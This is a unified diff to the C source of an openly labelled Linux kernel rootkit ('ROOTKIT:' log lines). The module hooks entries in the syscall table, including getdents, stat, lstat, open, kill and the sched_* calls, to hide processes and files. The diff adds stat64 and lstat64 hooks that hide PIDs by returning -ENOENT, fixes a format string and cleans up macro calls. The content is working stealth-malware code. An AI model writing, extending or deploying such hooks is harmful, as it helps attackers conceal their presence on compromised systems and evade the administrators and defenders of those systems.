@@ -114,8 +114,10 @@ static unsigned long *syscall_table = NULL;
 
 hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count)
 hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count)
-hook_define(2, long, stat, const char __user*, pathname, struct __old_kernel_stat __user*, statbuf)
-hook_define(2, long, lstat, const char __user*, pathname, struct __old_kernel_stat __user*, statbuf)
+hook_define(2, long, stat, const char __user*, pathname, struct stat __user*, statbuf) // actually newstat
+hook_define(2, long, stat64, const char __user*, pathname, struct stat64 __user*, statbuf)
+hook_define(2, long, lstat, const char __user*, pathname, struct stat __user*, statbuf) // actually newlstat
+hook_define(2, long, lstat64, const char __user*, pathname, struct stat64 __user*, statbuf)
 hook_define(1, long, chdir, const char __user*, pathname)
 hook_define(2, long, getpriority, int, which, int, who)
 hook_define(3, long, open, const char __user*, pathname, int, flags, umode_t, mode)
@@ -143,7 +145,7 @@ static asmlinkage long sys_getdents##v##_do_hook(unsigned int fd, struct linux_d
 	/* Copy dirent buff to kernel memory */                                                          \
 	my_dirent = kmalloc(ret, GFP_KERNEL);                                                            \
 	if (my_dirent == NULL){                                                                          \
-		log("ROOTKIT: ERROR kmalloc(%d) in getdents hook", ret);                                     \
+		log("ROOTKIT: ERROR kmalloc(%ld) in getdents hook", ret);                                     \
 		return -1;                                                                                   \
 	}                                                                                                \
 	copy_from_user(my_dirent, dirent, ret);                                                          \
@@ -200,14 +202,24 @@ static int check_pid(int pid, const char* syscall_caller){
 }
 
 // Hooks for those syscalls that will try to discover hidden PIDs
-static asmlinkage long sys_stat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
+static asmlinkage long sys_stat_do_hook(const char __user *pathname, struct stat __user *statbuf, const struct pt_regs* regs){
 	if (check_pid_in_pathname(pathname, "stat") == -1) return -ENOENT;
-	return sys_stat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
+	return sys_stat_orig(ARGS_ORIG(2, const char __user *, pathname, struct stat __user*, statbuf));
 }
 
-static asmlinkage long sys_lstat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
+static asmlinkage long sys_lstat_do_hook(const char __user *pathname, struct stat __user *statbuf, const struct pt_regs* regs){
 	if (check_pid_in_pathname(pathname, "lstat") == -1) return -ENOENT;
-	return sys_lstat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
+	return sys_lstat_orig(ARGS_ORIG(2, const char __user *, pathname, struct stat __user*, statbuf));
+}
+
+static asmlinkage long sys_stat64_do_hook(const char __user *pathname, struct stat64 __user *statbuf, const struct pt_regs* regs){
+	if (check_pid_in_pathname(pathname, "stat64") == -1) return -ENOENT;
+	return sys_stat64_orig(ARGS_ORIG(2, const char __user *, pathname, struct stat64 __user *, statbuf));
+}
+
+static asmlinkage long sys_lstat64_do_hook(const char __user *pathname, struct stat64 __user *statbuf, const struct pt_regs* regs){
+	if (check_pid_in_pathname(pathname, "lstat64") == -1) return -ENOENT;
+	return sys_lstat64_orig(ARGS_ORIG(2, const char __user *, pathname, struct stat64 __user*, statbuf));
 }
 
 static asmlinkage long sys_chdir_do_hook(const char __user *pathname, const struct pt_regs* regs){
@@ -280,17 +292,21 @@ int __init hooks_init(void){
 	perform_hook(getdents64, GETDENTS64)
 	perform_hook(stat, STAT)
 	perform_hook(lstat, LSTAT)
+	#if defined(__ARCH_WANT_STAT64) || defined(__ARCH_WANT_COMPAT_STAT64)
+	perform_hook(stat64, STAT64)
+	perform_hook(lstat64, LSTAT64)
+	#endif
 	perform_hook(chdir, CHDIR)
 	perform_hook(getpriority, GETPRIORITY)
 	perform_hook(open, OPEN)
 	perform_hook(openat, OPENAT)
-	perform_hook(getpgid, GETPGID);
-	perform_hook(getsid, GETSID);
-	perform_hook(sched_getaffinity, SCHED_GETAFFINITY);
-	perform_hook(sched_getparam, SCHED_GETPARAM);
-	perform_hook(sched_getscheduler, SCHED_GETSCHEDULER);
-	perform_hook(sched_rr_get_interval, SCHED_RR_GET_INTERVAL);
-	perform_hook(kill, KILL);
+	perform_hook(getpgid, GETPGID)
+	perform_hook(getsid, GETSID)
+	perform_hook(sched_getaffinity, SCHED_GETAFFINITY)
+	perform_hook(sched_getparam, SCHED_GETPARAM)
+	perform_hook(sched_getscheduler, SCHED_GETSCHEDULER)
+	perform_hook(sched_rr_get_interval, SCHED_RR_GET_INTERVAL)
+	perform_hook(kill, KILL)
 	DISABLE_WRITE();
 
 	log(KERN_INFO "ROOTKIT: Finished hooks\n");
@@ -304,16 +320,20 @@ void hooks_exit(void){
 	disable_hook(getdents64, GETDENTS64)
 	disable_hook(stat, STAT)
 	disable_hook(lstat, LSTAT)
+	#if defined(__ARCH_WANT_STAT64) || defined(__ARCH_WANT_COMPAT_STAT64)
+	disable_hook(stat64, STAT64)
+	disable_hook(lstat64, LSTAT64)
+	#endif
 	disable_hook(chdir, CHDIR)
 	disable_hook(getpriority, GETPRIORITY)
 	disable_hook(open, OPEN)
 	disable_hook(openat, OPENAT)
-	disable_hook(getpgid, GETPGID);
-	disable_hook(getsid, GETSID);
-	disable_hook(sched_getaffinity, SCHED_GETAFFINITY);
-	disable_hook(sched_getparam, SCHED_GETPARAM);
-	disable_hook(sched_getscheduler, SCHED_GETSCHEDULER);
-	disable_hook(sched_rr_get_interval, SCHED_RR_GET_INTERVAL);
-	disable_hook(kill, KILL);
+	disable_hook(getpgid, GETPGID)
+	disable_hook(getsid, GETSID)
+	disable_hook(sched_getaffinity, SCHED_GETAFFINITY)
+	disable_hook(sched_getparam, SCHED_GETPARAM)
+	disable_hook(sched_getscheduler, SCHED_GETSCHEDULER)
+	disable_hook(sched_rr_get_interval, SCHED_RR_GET_INTERVAL)
+	disable_hook(kill, KILL)
 	DISABLE_WRITE();
 }
